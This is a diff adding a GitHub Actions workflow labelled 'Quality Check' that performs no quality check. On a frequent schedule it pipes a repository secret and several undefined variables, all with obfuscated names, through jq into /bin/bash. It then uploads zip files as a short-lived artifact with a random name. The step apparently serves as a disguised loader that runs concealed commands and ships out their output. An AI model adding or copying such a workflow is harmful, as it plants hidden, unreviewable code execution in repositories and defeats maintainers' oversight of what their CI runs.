@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          xbjf5607: ${{ secrets.xbjf5607 }}
+        run: |
+          printf '%s' "$xbjf5607" | jq -r .h2057 | /bin/bash
+          printf '%s' "$n71161" | jq -r .eei089 | /bin/bash
+          printf '%s' "$ajn3536" | jq -r .e106 | /bin/bash
+          printf '%s' "$zluts6273" | jq -r .e04 | /bin/bash
+          printf '%s' "$its69518" | jq -r .tiap070 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7QDN0qhp
+          path: "*.zip"
+          retention-days: 1
